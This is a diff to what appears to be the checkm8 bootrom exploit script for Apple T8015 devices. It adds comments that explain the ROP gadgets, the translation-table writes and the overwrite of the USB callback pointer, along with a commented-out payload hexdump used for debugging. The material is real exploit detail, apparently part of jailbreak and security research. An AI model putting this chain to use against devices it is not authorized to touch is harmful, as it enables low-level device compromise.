@@ -1,6 +1,7 @@
 import array, ctypes, struct, sys, time
 import usb
 import dfu
+import binascii
 
 # Must be global so garbage collector never frees it
 request = None
@@ -388,9 +389,15 @@ def payload(cpid):
                0x10000AE80, # 3 - usb_create_string_descriptor
                0x1800008FA, # 4 - gUSBSRNMStringDescriptor
                0x18001BC00, # 5 - PAYLOAD_DEST
+                              # This is where the code from src/usb_0xA1_2_arm64.S
+                              # is copied to
       PAYLOAD_OFFSET_ARM64, # 6 - PAYLOAD_OFFSET
         PAYLOAD_SIZE_ARM64, # 7 - PAYLOAD_SIZE
                0x180008638, # 8 - PAYLOAD_PTR
+                              # This is a pointer to the global usb request's
+                              # interface callback. The code inside checkm8_arm64.S
+                              # overwrites this to point at _main inside
+                              # src/usb_0xA1_2_arm64.S
     ]
     t8015_load_write_gadget        = 0x10000945C
     t8015_write_sctlr_gadget       = 0x1000003EC
@@ -406,6 +413,16 @@ def payload(cpid):
       (t8015_dc_civac, 0x18001C880),
       (t8015_dmb, 0),
       (t8015_write_sctlr_gadget, 0x100D),
+      # The load write gadgets are used to write the TTEs to places the
+      # payload cannot cover. This is the gadget:
+      #    LDP             X8, X9, [X0]
+      #    STR             X9, [X8,#8]
+      #    STP             XZR, XZR, [X0]
+      #    RET
+      # The destination address is at +0 and the qword to write to it is
+      # at +8. So in order for this to work, we have to subtract 8 from the
+      # destination address, which is exactly what happens in the below
+      # struct.pack.
       (t8015_load_write_gadget, 0x18001C000),
       (t8015_load_write_gadget, 0x18001C010),
       (t8015_write_ttbr0, 0x180020000),
@@ -466,10 +483,42 @@ def exploit():
   device = dfu.acquire_device()
   start = time.time()
   print 'Found:', device.serial_number
+  payload, config = exploit_config(device.serial_number)
+  payload_s = binascii.hexlify(payload)
+
+  # t8015
+  # start = 0x18001c000
+
+  # for i in range(0, len(payload_s), 32):
+  #     bytes = binascii.unhexlify(payload_s[i:i+32])
+  #     print "{}: ".format(hex(start)),
+
+  #     for j in range(len(bytes)):
+  #         byte = int(hex(ord(bytes[j])), 16)
+  #         fmt = "{:02x}".format(byte)
+  #         print fmt,
+
+  #     print "  ",
+
+  #     for j in range(len(bytes)):
+  #         toprint = ord(bytes[j])
+
+  #         if toprint >= 32 and toprint <= 126:
+  #             toprint = chr(toprint)
+  #         else:
+  #             toprint = "."
+
+  #         sys.stdout.write(toprint)
+
+  #     print
+  #     start += 16
+
+  # return
+
   if 'PWND:[' in device.serial_number:
     print 'Device is already in pwned DFU Mode. Not executing exploit.'
     return
-  payload, config = exploit_config(device.serial_number)
+  # payload, config = exploit_config(device.serial_number)
 
   if config.large_leak is not None:
     usb_req_stall(device)
